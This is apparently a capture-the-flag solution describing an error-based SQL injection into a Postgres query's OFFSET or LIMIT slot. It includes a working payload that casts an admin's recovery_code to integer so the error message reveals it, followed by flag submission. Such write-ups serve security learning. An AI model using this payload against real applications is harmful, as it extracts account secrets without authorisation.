Place a scalar subquery in the `OFFSET` position that casts the value you want to
an integer. The admin's secret lives in `users.recovery_code`, and it contains
letters, so the cast fails and Postgres prints the whole value in the error. The
shape is:

```
page = (SELECT CAST(recovery_code AS integer) FROM users WHERE role='admin' LIMIT 1)
```

so the full query becomes:

```
SELECT title, body FROM feed ORDER BY id
LIMIT 10 OFFSET (SELECT CAST(recovery_code AS integer) FROM users WHERE role='admin' LIMIT 1)
```

Postgres answers `invalid input syntax for type integer: "<recovery_code>"`. Read
the 24-character value out of the quotes and submit it to `/solve?code=<value>` to
get the flag. (URL-encode the payload; the `LIMIT` slot via `size=` works too.)
